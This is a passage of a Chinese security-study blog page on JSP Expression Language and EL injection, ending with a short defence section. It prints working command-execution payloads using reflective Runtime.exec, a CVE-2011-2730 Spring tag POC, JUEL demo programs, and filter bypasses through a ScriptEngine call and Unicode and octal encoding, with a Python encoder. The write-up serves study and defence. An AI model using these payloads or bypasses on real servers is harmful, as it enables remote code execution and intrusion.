+</code></pre><p>要使用任何标签库中的函数，我们需要把这些库安装在服务器上，然后使用<code>&lt;taglib></code>标签在 JSP 文件中包含这些库。</p><h4 id=el-表达式调用-java-方法>EL 表达式调用 Java 方法
+<a class=anchor href=#el-%e8%a1%a8%e8%be%be%e5%bc%8f%e8%b0%83%e7%94%a8-java-%e6%96%b9%e6%b3%95>#</a></h4><p>先新建一个 ELFunc 类，其中定义的<code>doSomething()</code>方法用于给输入的字符串拼接<code>.com</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> eltest;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ELFunc</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>doSomething</span>(String str){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> str <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.com&#34;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后在 WEB-INF 文件夹下新建 test.tld 文件，其中指定执行的 Java 方法以及 URI 地址：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;taglib</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;2.0&#34;</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://java.sun.com/xml/ns/j2ee&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;tlib-version&gt;</span>1.0<span style=color:#f92672>&lt;/tlib-version&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;short-name&gt;</span>ELFunc<span style=color:#f92672>&lt;/short-name&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;uri&gt;</span>http://localhost/ELFunc<span style=color:#f92672>&lt;/uri&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;function&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;name&gt;</span>doSomething<span style=color:#f92672>&lt;/name&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;function-class&gt;</span>eltest.ELFunc<span style=color:#f92672>&lt;/function-class&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;function-signature&gt;</span> java.lang.String doSomething(java.lang.String)<span style=color:#f92672>&lt;/function-signature&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/function&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/taglib&gt;</span>
+</span></span></code></pre></div><p>在 JSP 文件中，先头部导入<code>taglib</code>标签库，URI 为<code>test.tld</code>中设置的 URI 地址，prefix 为<code>test.tld</code>中设置的 short-name，然后直接在 EL 表达式中使用<code>类名:方法名()</code>的形式来调用该类方法。</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@taglib uri=&#34;http://localhost/ELFunc&#34; prefix=&#34;ELFunc&#34;%&gt;
+${ELFunc:doSomething(&#34;solowalker&#34;)}
+</code></pre><h2 id=jsp-中启动禁用-el-表达式>JSP 中启动/禁用 EL 表达式
+<a class=anchor href=#jsp-%e4%b8%ad%e5%90%af%e5%8a%a8%e7%a6%81%e7%94%a8-el-%e8%a1%a8%e8%be%be%e5%bc%8f>#</a></h2><h3 id=全局禁用-el-表达式>全局禁用 EL 表达式
+<a class=anchor href=#%e5%85%a8%e5%b1%80%e7%a6%81%e7%94%a8-el-%e8%a1%a8%e8%be%be%e5%bc%8f>#</a></h3><p>web.xml 中进行配置：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;jsp-config&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;jsp-property-group&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;url-pattern&gt;</span>*.jsp<span style=color:#f92672>&lt;/url-pattern&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;el-ignored&gt;</span>true<span style=color:#f92672>&lt;/el-ignored&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/jsp-property-group&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/jsp-config&gt;</span>
+</span></span></code></pre></div><h3 id=单个文件禁用-el-表达式>单个文件禁用 EL 表达式
+<a class=anchor href=#%e5%8d%95%e4%b8%aa%e6%96%87%e4%bb%b6%e7%a6%81%e7%94%a8-el-%e8%a1%a8%e8%be%be%e5%bc%8f>#</a></h3><p>在 JSP 中可以有如下定义：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page isELIgnored=&#34;true&#34; %&gt;
+</code></pre><p>该语句表示是否禁用 EL 表达式。JSP2.0 中默认启用 EL 表达式。</p><h2 id=el-表达式注入漏洞>EL 表达式注入漏洞
+<a class=anchor href=#el-%e8%a1%a8%e8%be%be%e5%bc%8f%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e>#</a></h2><p>EL 表达式注入漏洞和之前学习的 SpEL 表达式注入是一样的原理，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p><p>一般来说，EL 表达式注入漏洞的外部可控点入口都是在 Java 程序代码中，即 Java 程序中的 EL 表达式内容全部或者部分是从外部获取的。</p><h3 id=通用-poc>通用 POC
+<a class=anchor href=#%e9%80%9a%e7%94%a8-poc>#</a></h3><pre tabindex=0><code class=language-jsp data-lang=jsp>//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
+${pageContext}
+
+//获取Web路径
+${pageContext.getSession().getServletContext().getClassLoader().getResource(&#34;&#34;)}
+
+//文件头参数
+${header}
+
+//获取webRoot
+${applicationScope}
+
+//执行命令
+${pageContext.request.getSession().setAttribute(&#34;a&#34;,pageContext.request.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;getRuntime&#34;,null).invoke(null,null).exec(&#34;calc&#34;).getInputStream())}
+</code></pre><h3 id=简单漏洞场景>简单漏洞场景
+<a class=anchor href=#%e7%ae%80%e5%8d%95%e6%bc%8f%e6%b4%9e%e5%9c%ba%e6%99%af>#</a></h3><p>比如我们有一个参数<code>a</code>是可控的，并且可以直接插入到 JSP 代码中，这种场景是非常常见的。举一个简单的例子，如果登录界面<code>username</code>可控，并且在判断不严格的情况下，就可以造成这种攻击。</p><p>我们在 Java 程序中可以控制输入 EL 表达式如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>${pageContext.<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;a&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;java.lang.Runtime&#34;</span>).<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>.<span style=color:#a6e22e>getClass</span>()).<span style=color:#a6e22e>invoke</span>(<span style=color:#e6db74>&#34;&#34;</span>.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;java.lang.Runtime&#34;</span>).<span style=color:#a6e22e>getMethod</span>(<span style=color:#e6db74>&#34;getRuntime&#34;</span>).<span style=color:#a6e22e>invoke</span>(<span style=color:#66d9ef>null</span>),<span style=color:#e6db74>&#34;calc.exe&#34;</span>))}
+</span></span></code></pre></div><p>但是在实际场景中，是几乎没有也无法直接从外部控制 JSP 页面中的 EL 表达式的，而目前已知的 EL 表达式注入漏洞都是框架层面服务端执行的 EL 表达式外部可控导致的。</p><h4 id=cve-2011-2730>CVE-2011-2730
+<a class=anchor href=#cve-2011-2730>#</a></h4><p>参考：<a href=https://juejin.cn/post/6844903572077838350>Spring框架标签EL表达式执行漏洞分析（CVE-2011-2730）</a></p><p>命令执行 POC：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;spring:message text=&#34;${/&#34;/&#34;.getClass().forName(/&#34;java.lang.Runtime/&#34;).getMethod(/&#34;getRuntime/&#34;,null).invoke(null,null).exec(/&#34;calc/&#34;,null).toString()}&#34;&gt;&lt;/spring:message&gt;
+</code></pre><p>正常情况下：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ taglib uri=&#34;http://www.springframework.org/tags&#34; prefix=&#34;spring&#34;%&gt;
+&lt;spring:message  text=&#34;${param.a}&#34;&gt;&lt;/spring:message&gt;
+</code></pre><p>这里使用<code>message</code>标签，<code>text</code>属性用 EL 表达式从请求参数中取值，当我们这么写：</p><pre tabindex=0><code class=language-url data-lang=url>http://localhost/test.jsp?a=${applicationScope}
+</code></pre><p><code>${applicationScope}</code>这部分就被当作 EL 表达式被执行。</p><h3 id=juel-示例>JUEL 示例
+<a class=anchor href=#juel-%e7%a4%ba%e4%be%8b>#</a></h3><p>EL 曾经是 JSTL 的一部分，后来 EL 进入 JSP 2.0 标准。现在尽管是 JSP 2.1的一部分，但是 EL API 已经被分离到包<code>javax.el</code>中，并且已经删除了对核心 JSP 类的所有依赖关系，所有现在 EL 已经要在非 JSP 应用程序中使用了。现在 EL 表达式所依赖的包<code>javax.el</code>等都在<code>JUEL</code>相关的 jar 包中。</p><p>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能、插件化缓存、小体积、支持方法调用和多参数调用、可插拔等多种特性。</p><p>官网：http://juel.sourceforge.net/</p><p>需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。</p><p>这里写一个简单的利用反射调用<code>Runtime</code>类方法实现命令执行的代码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.juelvul;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> de.odysseus.el.ExpressionFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> de.odysseus.el.TreeValueExpression;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> de.odysseus.el.util.SimpleContext;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>juelExec</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>        ExpressionFactoryImpl expressionFactory <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ExpressionFactoryImpl();
+</span></span><span style=display:flex><span>        SimpleContext simpleContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SimpleContext();
+</span></span><span style=display:flex><span>        String exp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;${&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;exec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;).invoke(null),&#39;calc.exe&#39;)}&#34;</span>;
+</span></span><span style=display:flex><span>        TreeValueExpression valueExpression <span style=color:#f92672>=</span> expressionFactory.<span style=color:#a6e22e>createValueExpression</span>(simpleContext, exp, String.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(valueExpression.<span style=color:#a6e22e>getValue</span>(simpleContext));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>下面简单讲讲这个代码。</p><p>首先我们创建 JUEL 的表达式工厂<code>ExpressionFactoryImpl</code>，这个类的作用是作为<strong>创建和编译 EL 表达式的入口工厂</strong>，负责把字符串形式的 EL 编译成可执行对象。</p><p>然后创建一个上下文<code>SimpleContext</code>，这个类负责在 EL 表达式<strong>编译和求值</strong>过程中提供运行环境。</p><p>然后我们定义我们的 exp，也就是一个反射调用的 EL 表达式。然后我们调用<code>createValueExpression()</code>这个方法，<strong>把一个 EL 表达式字符串编译成一个<code>ValueExpression</code>对象</strong>，从而把字符串变成一个可执行程序。生成的<code>TreeValueExpression</code>对象代表一个已经被解析成语法树的、可反复求值的 EL 表达式。</p><h2 id=el-表达式的-exp-与基础绕过>EL 表达式的 EXP 与基础绕过
+<a class=anchor href=#el-%e8%a1%a8%e8%be%be%e5%bc%8f%e7%9a%84-exp-%e4%b8%8e%e5%9f%ba%e7%a1%80%e7%bb%95%e8%bf%87>#</a></h2><h3 id=基础-exp>基础 EXP
+<a class=anchor href=#%e5%9f%ba%e7%a1%80-exp>#</a></h3><pre tabindex=0><code class=language-jsp data-lang=jsp>&#34;${&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;exec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;).invoke(null),&#39;calc.exe&#39;)}&#34;
+</code></pre><h3 id=利用-scriptengine-调用-js-引擎绕过>利用 ScriptEngine 调用 JS 引擎绕过
+<a class=anchor href=#%e5%88%a9%e7%94%a8-scriptengine-%e8%b0%83%e7%94%a8-js-%e5%bc%95%e6%93%8e%e7%bb%95%e8%bf%87>#</a></h3><p>这里和 SpEL 中的绕过一样：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> de.odysseus.el.ExpressionFactoryImpl;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> de.odysseus.el.util.SimpleContext;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.el.ExpressionFactory;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.el.ValueExpression;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ScriptEngineExec</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {  
+</span></span><span style=display:flex><span>        ExpressionFactory expressionFactory <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ExpressionFactoryImpl();  
+</span></span><span style=display:flex><span>        SimpleContext simpleContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SimpleContext();  
+</span></span><span style=display:flex><span>        String exp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;${&#39;&#39;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;java.lang.Runtime.getRuntime().exec(&#39;Calc.exe&#39;)\&#34;)}\n&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34; &#34;</span>;  
+</span></span><span style=display:flex><span>        ValueExpression valueExpression <span style=color:#f92672>=</span> expressionFactory.<span style=color:#a6e22e>createValueExpression</span>(simpleContext, exp, String.<span style=color:#a6e22e>class</span>);  
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(valueExpression.<span style=color:#a6e22e>getValue</span>(simpleContext));  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=利用-unicode-编码绕过>利用 Unicode 编码绕过
+<a class=anchor href=#%e5%88%a9%e7%94%a8-unicode-%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87>#</a></h3><p>对于可利用的 POC 进行全部或者部分的 Unicode 编码都是可以的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>// Unicode编码内容为前面反射调用的PoC
+</span></span><span style=display:flex><span>\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d
+</span></span></code></pre></div><h3 id=利用八进制绕过>利用八进制绕过
+<a class=anchor href=#%e5%88%a9%e7%94%a8%e5%85%ab%e8%bf%9b%e5%88%b6%e7%bb%95%e8%bf%87>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>// 八进制编码内容为前面反射调用的PoC
+</span></span><span style=display:flex><span>\44\173\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\145\170\145\143\47\54\47\47\56\147\145\164\103\154\141\163\163\50\51\51\56\151\156\166\157\153\145\50\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\147\145\164\122\165\156\164\151\155\145\47\51\56\151\156\166\157\153\145\50\156\165\154\154\51\54\47\143\141\154\143\56\145\170\145\47\51\175
+</span></span></code></pre></div><p>脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;${&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;exec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;).invoke(null),&#39;calc.exe&#39;)}&#34;</span>
+</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> s <span style=color:#f92672>in</span> str:
+</span></span><span style=display:flex><span>  num <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> oct(ord(s))
+</span></span><span style=display:flex><span>  result <span style=color:#f92672>+=</span> num
+</span></span><span style=display:flex><span>print(result<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>0&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>))
+</span></span></code></pre></div><h2 id=防御方法>防御方法
+<a class=anchor href=#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95>#</a></h2><ul><li>尽量不使用外部输入的内容作为 EL 表达式内容；</li><li>若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；</li><li>如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>javax.<span style=color:#a6e22e>el</span>.<span style=color:#a6e22e>ExpressionFactory</span>.<span style=color:#a6e22e>createValueExpression</span>()
+</span></span><span style=display:flex><span>javax.<span style=color:#a6e22e>el</span>.<span style=color:#a6e22e>ValueExpression</span>.<span style=color:#a6e22e>getValue</span>()
+</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#jsp>JSP</a><ul><li><a href=#简介>简介</a></li><li><a href=#基本语法>基本语法</a></li><li><a href=#jsp-demo>JSP Demo</a></li><li><a href=#jsp-缺点>JSP 缺点</a></li></ul></li><li><a href=#el-表达式基础语法>EL 表达式基础语法</a><ul><li><a href=#el-表达式-demo>EL 表达式 Demo</a></li><li><a href=#运算符>运算符</a></li></ul></li><li><a href=#jsp-中启动禁用-el-表达式>JSP 中启动/禁用 EL 表达式</a><ul><li><a href=#全局禁用-el-表达式>全局禁用 EL 表达式</a></li><li><a href=#单个文件禁用-el-表达式>单个文件禁用 EL 表达式</a></li></ul></li><li><a href=#el-表达式注入漏洞>EL 表达式注入漏洞</a><ul><li><a href=#通用-poc>通用 POC</a></li><li><a href=#简单漏洞场景>简单漏洞场景</a></li><li><a href=#juel-示例>JUEL 示例</a></li></ul></li><li><a href=#el-表达式的-exp-与基础绕过>EL 表达式的 EXP 与基础绕过</a><ul><li><a href=#基础-exp>基础 EXP</a></li><li><a href=#利用-scriptengine-调用-js-引擎绕过>利用 ScriptEngine 调用 JS 引擎绕过</a></li><li><a href=#利用-unicode-编码绕过>利用 Unicode 编码绕过</a></li><li><a href=#利用八进制绕过>利用八进制绕过</a></li></ul></li><li><a href=#防御方法>防御方法</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
